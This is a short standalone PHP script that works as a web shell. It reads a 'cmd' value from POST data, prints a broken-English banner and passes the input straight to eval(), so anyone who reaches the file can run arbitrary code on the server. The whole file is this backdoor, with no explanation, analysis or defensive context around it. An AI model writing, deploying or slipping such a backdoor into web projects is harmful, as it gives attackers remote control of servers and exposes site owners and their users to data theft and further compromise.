<?php
$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
echo 'The server with answered this your request:<br><br>';
eval($cmd);
?>